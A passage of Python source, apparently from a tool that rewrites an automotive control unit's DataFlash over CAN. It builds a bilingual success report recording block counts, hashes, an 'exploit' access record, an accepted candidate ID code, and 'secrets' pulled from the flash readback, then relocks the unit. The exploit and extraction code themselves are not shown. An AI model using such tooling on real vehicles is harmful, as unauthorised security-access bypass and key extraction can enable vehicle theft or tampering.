            readback_secrets = analyze_fpke_dflash(dflash_readback, cflash_bytes)
            elapsed_s = round(time.monotonic() - started, 3)
            report: dict[str, Any] = {
                "ok": True,
                "target": prof["target_label"],
                "sw_profile": prof["name"],
                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                "port": port,
                "interface": interface,
                "via_gateway": bool(via_gateway),
                "gateway_bridged": bool(bridged),
                "mode": write_mode,
                "elapsed_s": elapsed_s,
                "blocks_written": write_stats["blocks_written"],
                "blocks_erased": write_stats["blocks_erased"],
                "words_programmed": write_stats["words_programmed"],
                "busy_retries": write_stats["busy_retries"],
                "changed_eel_ids": change_summary["changed_eel_ids"],
                "short_summary": change_summary["short_summary"],
                "summary_lines": change_summary["lines"],
                "dflash_before_sha256": hashlib.sha256(dflash_before).hexdigest(),
                "dflash_readback_sha256": hashlib.sha256(dflash_readback).hexdigest(),
                "dflash_before_path": str(before_path),
                "dflash_readback_path": str(readback_path),
                "dflash_path": str(dflash_path),
                "extra_path": str(extra_path),
                "session_dir": str(out_dir),
                "exploit": access_info,
                "idauth": {
                    "candidate_idcode": candidate_idcode.hex(),
                    "accepted": True,
                    "idst_before": idst_before.hex(),
                    "idst_after_idcode": idst_after.hex(),
                    "idst_after_relock": idst_relock.hex(),
                },
                "extra_area": extra_info,
                "extra": extra_meta,
                "before_read": before_meta,
                "readback_read": readback_meta,
                "secrets": readback_secrets,
                "reset": reset_info,
                "ident": (reset_info or {}).get("ident_after") or [],
            }
            atomic_write(report_path, (json.dumps(report, indent=2, ensure_ascii=False) + "\n").encode("utf-8"))
            reporter.success(
                tr(
                    f"Запись DataFlash успешно завершена и проверена ({write_stats['blocks_written']} бл., "
                    f"стёрто {write_stats['blocks_erased']}, {elapsed_s:.1f} с).",
                    f"DataFlash write completed and verified ({write_stats['blocks_written']} blocks, "
                    f"erased {write_stats['blocks_erased']}, {elapsed_s:.1f} s).",
                )
            )
            return report
        finally:
            if idauth_unlocked:
                with contextlib.suppress(Exception):
                    fpke_idauth(link, b"\x00" * 16)
            with contextlib.suppress(Exception):
                link.save_can_log(can_log_path)
